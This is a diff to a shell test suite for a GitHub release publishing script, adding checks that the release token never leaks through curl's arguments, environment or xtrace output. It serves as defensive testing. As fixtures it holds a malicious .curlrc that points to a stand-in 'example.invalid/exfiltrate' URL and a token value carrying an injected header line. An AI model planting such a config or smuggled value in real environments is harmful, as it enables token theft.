@@ -20,9 +20,42 @@ cat > "$fakebin/curl" <<'SH'
 #!/usr/bin/env bash
 set -euo pipefail
 : "${GH_STATE:?}"
+: "${AUTH_SENTINEL_FILE:?}"
 mkdir -p "$GH_STATE"
+
+release_token=$(cat "$AUTH_SENTINEL_FILE")
+process_cmdline=$(tr '\0' '\n' < "/proc/$$/cmdline")
+process_environ=$(tr '\0' '\n' < "/proc/$$/environ")
+case $process_cmdline in
+  *"$release_token"*)
+    printf 'release token leaked through curl argv\n' >&2
+    exit 2
+    ;;
+esac
+case $process_environ in
+  *"$release_token"*)
+    printf 'release token leaked through curl environment\n' >&2
+    exit 2
+    ;;
+esac
+while IFS= read -r environment_entry; do
+  case $environment_entry in
+    GH_TOKEN=*|GITHUB_TOKEN=*|HOME=*|CURL_HOME=*)
+      printf 'sensitive publisher variable leaked through curl environment: %s\n' \
+        "${environment_entry%%=*}" >&2
+      exit 2
+      ;;
+  esac
+done <<< "$process_environ"
+printf 'process-auth-clean\n' >> "$GH_STATE/curl-process-inspection.log"
+
 printf '%q ' "$@" >> "$GH_STATE/curl-calls.log"
 printf '\n' >> "$GH_STATE/curl-calls.log"
+[ "${1:-}" = --disable ] || {
+  printf 'curl config loading was not disabled by the first argument\n' >&2
+  exit 2
+}
+shift
 
 method=
 data=
@@ -38,7 +71,16 @@ while [ "$#" -gt 0 ]; do
     --header)
       case $2 in
         'Accept: application/vnd.github+json') accept=true ;;
-        'Authorization: Bearer test-release-token') authorization=true ;;
+        @-)
+          IFS= read -r auth_header
+          [ "$auth_header" = "Authorization: Bearer $release_token" ]
+          if IFS= read -r extra_auth_line; then
+            printf 'curl received more than one authentication header line\n' >&2
+            exit 2
+          fi
+          printf 'stdin-authenticated\n' >> "$GH_STATE/curl-stdin-auth.log"
+          authorization=true
+          ;;
         'X-GitHub-Api-Version: 2022-11-28') api_version=true ;;
         'Content-Type: application/octet-stream') content_type=true ;;
         *) printf 'unexpected curl header: %s\n' "$2" >&2; exit 2 ;;
@@ -86,6 +128,9 @@ cat > "$fakebin/gh" <<'SH'
 #!/usr/bin/env bash
 set -euo pipefail
 : "${GH_STATE:?}"
+: "${AUTH_SENTINEL_FILE:?}"
+: "${GH_TOKEN:?}"
+[ "$GH_TOKEN" = "$(cat "$AUTH_SENTINEL_FILE")" ]
 mkdir -p "$GH_STATE"
 printf '%q ' "$@" >> "$GH_STATE/calls.log"
 printf '\n' >> "$GH_STATE/calls.log"
@@ -286,6 +331,11 @@ exit 2
 SH
 chmod +x "$fakebin/gh" "$fakebin/sleep" "$fakebin/curl"
 
+release_token="test-release-token-$RANDOM-$RANDOM-$$"
+fallback_token="test-github-token-$RANDOM-$RANDOM-$$"
+token_sentinel_file=$scratch/release-token-sentinel
+printf '%s\n' "$release_token" > "$token_sentinel_file"
+
 mkdir -p "$scratch/release"
 printf 'alpha\n' > "$scratch/release/alpha.bin"
 printf 'beta\n' > "$scratch/release/beta.bin"
@@ -296,11 +346,43 @@ run_publish() {
   local state=$1
   local notes=${PUBLISH_NOTES_FILE:-"$scratch/release/BUILD-PARAMETERS.md"}
   shift
-  PATH="$fakebin:$PATH" GH_STATE="$state" GH_TOKEN=test-release-token \
+  PATH="$fakebin:$PATH" GH_STATE="$state" \
+    AUTH_SENTINEL_FILE="$token_sentinel_file" \
+    GH_TOKEN="$release_token" GITHUB_TOKEN="$fallback_token" \
     GITHUB_REPOSITORY=owner/repository \
     GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 \
     "$@" bash "$PUBLISH" test-20260715 "$scratch/release" "$notes"
 }
+
+assert_curl_auth_hygiene() {
+  local state=$1
+
+  [ -s "$state/curl-process-inspection.log" ]
+  [ -s "$state/curl-stdin-auth.log" ]
+  if grep -Fq -- "$release_token" "$state/curl-calls.log"; then
+    printf 'release token was recorded in curl arguments\n' >&2
+    exit 1
+  fi
+}
+
+state_token_newline=$scratch/state-token-newline
+if run_publish "$state_token_newline" env PRERELEASE=1 \
+    GH_TOKEN=$'test-release-token\nInjected: value' >/dev/null 2>&1; then
+  printf 'publisher accepted a release token containing a line break\n' >&2
+  exit 1
+fi
+[ ! -e "$state_token_newline" ]
+
+printf -v overlong_token '%4097s' ''
+overlong_token=${overlong_token// /x}
+state_token_overlong=$scratch/state-token-overlong
+if run_publish "$state_token_overlong" env PRERELEASE=1 \
+    GH_TOKEN="$overlong_token" >/dev/null 2>&1; then
+  printf 'publisher accepted an overlong release token\n' >&2
+  exit 1
+fi
+[ ! -e "$state_token_overlong" ]
+printf 'PASS unsafe release token framing is rejected before remote access\n'
 
 printf '# Different Notes\n' > "$scratch/untracked-notes.md"
 state_notes_mismatch=$scratch/state-notes-mismatch
@@ -329,6 +411,43 @@ printf 'PASS publication requires explicit prerelease-only mode\n'
 
 state_prerelease=$scratch/state-prerelease
 run_publish "$state_prerelease" env PRERELEASE=1 >/dev/null
+assert_curl_auth_hygiene "$state_prerelease"
+printf 'PASS curl upload authentication stays out of argv and child environment\n'
+
+malicious_home=$scratch/malicious-curl-home
+mkdir -p "$malicious_home"
+curlrc_trace=$scratch/curlrc-trace.log
+curlrc_exfiltration=$scratch/curlrc-exfiltration.log
+{
+  printf 'trace-ascii = "%s"\n' "$curlrc_trace"
+  printf 'url = "https://example.invalid/exfiltrate"\n'
+  printf 'output = "%s"\n' "$curlrc_exfiltration"
+} > "$malicious_home/.curlrc"
+state_xtrace=$scratch/state-xtrace
+xtrace_log=$scratch/publisher-xtrace.log
+PATH="$fakebin:$PATH" GH_STATE="$state_xtrace" \
+  AUTH_SENTINEL_FILE="$token_sentinel_file" \
+  GH_TOKEN="$release_token" GITHUB_TOKEN="$fallback_token" \
+  GITHUB_REPOSITORY=owner/repository \
+  GITHUB_SHA=0123456789abcdef0123456789abcdef01234567 \
+  PRERELEASE=1 HOME="$malicious_home" CURL_HOME="$malicious_home" \
+  bash -x "$PUBLISH" test-20260715 "$scratch/release" \
+  "$scratch/release/BUILD-PARAMETERS.md" >"$xtrace_log" 2>&1
+assert_curl_auth_hygiene "$state_xtrace"
+if grep -Fq -- "$release_token" "$xtrace_log" ||
+   grep -Fq -- "$fallback_token" "$xtrace_log"; then
+  printf 'publisher xtrace leaked a GitHub token\n' >&2
+  exit 1
+fi
+[ ! -e "$curlrc_trace" ] || {
+  printf 'malicious curl config enabled trace output\n' >&2
+  exit 1
+}
+[ ! -e "$curlrc_exfiltration" ] || {
+  printf 'malicious curl config added an output target\n' >&2
+  exit 1
+}
+printf 'PASS publisher disables inherited xtrace and user curl configuration\n'
 if grep -Fq 'repos/owner/repository/releases/tags/' "$state_prerelease/calls.log"; then
   printf 'draft release was queried through the tag endpoint\n' >&2
   exit 1
@@ -462,6 +581,7 @@ if run_publish "$state_upload_fail" env PRERELEASE=1 GH_FAIL_UPLOAD=1 >/dev/null
   printf 'simulated upload failure was accepted\n' >&2
   exit 1
 fi
+assert_curl_auth_hygiene "$state_upload_fail"
 [ "$(cat "$state_upload_fail/draft")" = true ]
 [ ! -f "$state_upload_fail/patch-fields.log" ]
 before=$(wc -l < "$state_upload_fail/events.log")
